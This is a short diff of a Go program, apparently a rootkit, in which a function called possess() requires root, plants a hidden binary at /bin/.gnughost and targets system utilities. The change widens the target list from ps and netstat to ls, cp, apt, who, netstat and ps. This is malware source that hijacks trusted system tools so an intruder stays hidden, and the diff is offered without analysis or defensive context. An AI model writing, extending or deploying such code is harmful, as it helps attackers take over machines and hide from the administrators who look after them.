@@ -127,8 +127,8 @@ func possess() {
 		log.Fatal("possess requires root.")
 	}
 	ghostpath := "/bin/.gnughost"
-	targets := [2]string{"/bin/ps", "/bin/netstat"}
-	//targets := [6]string{"/bin/ls","/bin/cp","/bin/apt","/bin/who", "/bin/netstat", "/bin/ps"}
+	//targets := [2]string{"/bin/ps", "/bin/netstat"}
+	targets := [6]string{"/bin/ls","/bin/cp","/bin/apt","/bin/who", "/bin/netstat", "/bin/ps"}
 	
 	// Copy Ghost to ghostpath if not there already
 	if _, e := os.Stat(ghostpath); os.IsNotExist(e) {
